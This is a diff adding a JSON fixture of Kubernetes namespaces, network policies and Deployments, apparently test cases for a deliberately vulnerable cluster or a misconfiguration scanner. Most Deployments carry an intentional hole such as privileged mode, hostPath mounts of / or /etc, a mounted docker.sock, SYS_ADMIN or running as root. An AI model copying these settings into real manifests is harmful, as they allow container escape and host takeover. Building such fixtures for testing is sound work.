@@ -1,0 +1,9715 @@
+{
+ "namespaces": [
+  {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "name": "dvka-vuln"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "name": "dvka-baseline",
+    "labels": {
+     "pod-security.kubernetes.io/enforce": "baseline"
+    }
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "name": "dvka-egress-open",
+    "labels": {
+     "pod-security.kubernetes.io/enforce": "restricted"
+    }
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "name": "default"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "name": "dvka-secure",
+    "labels": {
+     "pod-security.kubernetes.io/enforce": "restricted"
+    }
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "name": "kube-system"
+   }
+  }
+ ],
+ "networkpolicies": [
+  {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "default-deny-ingress",
+    "namespace": "dvka-baseline"
+   },
+   "spec": {
+    "podSelector": {},
+    "policyTypes": [
+     "Ingress"
+    ]
+   }
+  },
+  {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "egress-allow-all",
+    "namespace": "dvka-egress-open"
+   },
+   "spec": {
+    "podSelector": {},
+    "policyTypes": [
+     "Egress",
+     "Ingress"
+    ],
+    "egress": [
+     {}
+    ],
+    "ingress": [
+     {}
+    ]
+   }
+  },
+  {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "name": "default-deny-all",
+    "namespace": "dvka-secure"
+   },
+   "spec": {
+    "podSelector": {},
+    "policyTypes": [
+     "Ingress",
+     "Egress"
+    ]
+   }
+  }
+ ],
+ "deployments": [
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-privileged",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-privileged"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-privileged"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-privileged"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "privileged": true
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-host-pid",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-pid"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-pid"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-pid"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "hostPID": true
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-hostpath-etc",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-etc"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-hostpath-etc"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-hostpath-etc"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "h",
+          "mountPath": "/host-etc"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "h",
+        "hostPath": {
+         "path": "/etc"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-hostpath-root",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-root"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-hostpath-root"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-hostpath-root"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "h",
+          "mountPath": "/host"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "h",
+        "hostPath": {
+         "path": "/"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-hostpath-writable",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-hostpath-writable"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-hostpath-writable"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-hostpath-writable"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "h",
+          "mountPath": "/data"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "h",
+        "hostPath": {
+         "path": "/var/log/dvka"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-docker-socket",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-docker-socket"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-docker-socket"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-docker-socket"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "volumeMounts": [
+         {
+          "name": "d",
+          "mountPath": "/var/run/docker.sock"
+         }
+        ]
+       }
+      ],
+      "volumes": [
+       {
+        "name": "d",
+        "hostPath": {
+         "path": "/var/run/docker.sock"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-cap-sys-admin",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-cap-sys-admin"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-cap-sys-admin"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-cap-sys-admin"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ],
+          "add": [
+           "SYS_ADMIN"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-caps-not-dropped",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-caps-not-dropped"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-caps-not-dropped"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-caps-not-dropped"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {}
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-allow-privesc",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-allow-privesc"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-allow-privesc"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-allow-privesc"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-run-as-root",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-run-as-root"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-run-as-root"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-run-as-root"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "runAsUser": 0,
+         "runAsNonRoot": false
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-writable-rootfs",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-writable-rootfs"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-writable-rootfs"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-writable-rootfs"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": false,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-no-seccomp",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-seccomp"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-no-seccomp"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-no-seccomp"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-no-limits",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-limits"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-no-limits"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-no-limits"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-sa-automount",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-sa-automount"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-sa-automount"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-sa-automount"
+      }
+     },
+     "spec": {
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-latest-tag",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-latest-tag"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-latest-tag"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-latest-tag"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:latest",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-untagged-image",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-untagged-image"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-untagged-image"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-untagged-image"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-sshd",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-sshd"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-sshd"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-sshd"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "command": [
+         "/usr/sbin/sshd",
+         "-D"
+        ]
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-init-privileged",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-init-privileged"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-init-privileged"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-init-privileged"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "initContainers": [
+       {
+        "name": "init",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "privileged": true,
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-kitchen-sink",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-kitchen-sink"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-kitchen-sink"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-kitchen-sink"
+      }
+     },
+     "spec": {
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:latest",
+        "securityContext": {
+         "allowPrivilegeEscalation": true,
+         "readOnlyRootFilesystem": false,
+         "capabilities": {},
+         "privileged": true,
+         "runAsUser": 0,
+         "runAsNonRoot": false
+        },
+        "volumeMounts": [
+         {
+          "name": "d",
+          "mountPath": "/var/run/docker.sock"
+         }
+        ]
+       }
+      ],
+      "hostPID": true,
+      "hostNetwork": true,
+      "hostIPC": true,
+      "volumes": [
+       {
+        "name": "d",
+        "hostPath": {
+         "path": "/var/run/docker.sock"
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-host-port",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-port"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-port"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-port"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        },
+        "ports": [
+         {
+          "containerPort": 8080,
+          "hostPort": 8080
+         }
+        ]
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-share-process",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-share-process"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-share-process"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-share-process"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ],
+      "shareProcessNamespace": true
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-no-security-context",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-security-context"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-no-security-context"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-no-security-context"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-host-process",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-process"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-host-process"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-host-process"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         },
+         "windowsOptions": {
+          "hostProcess": true
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
+          "memory": "64Mi"
+         }
+        }
+       }
+      ]
+     }
+    }
+   }
+  },
+  {
+   "apiVersion": "apps/v1",
+   "kind": "Deployment",
+   "metadata": {
+    "name": "wl-default-ns",
+    "namespace": "default",
+    "labels": {
+     "app": "wl-default-ns"
+    }
+   },
+   "spec": {
+    "replicas": 1,
+    "selector": {
+     "matchLabels": {
+      "app": "wl-default-ns"
+     }
+    },
+    "template": {
+     "metadata": {
+      "labels": {
+       "app": "wl-default-ns"
+      }
+     },
+     "spec": {
+      "automountServiceAccountToken": false,
+      "securityContext": {
+       "runAsNonRoot": true,
+       "runAsUser": 10001,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "containers": [
+       {
+        "name": "app",
+        "image": "registry.k8s.io/pause:3.9",
+        "securityContext": {
+         "allowPrivilegeEscalation": false,
+         "readOnlyRootFilesystem": true,
+         "capabilities": {
+          "drop": [
+           "ALL"
+          ]
+         }
+        },
+        "resources": {
+         "limits": {
+          "cpu": "250m",
+          "memory": "128Mi"
+         },
+         "requests": {
+          "cpu": "50m",
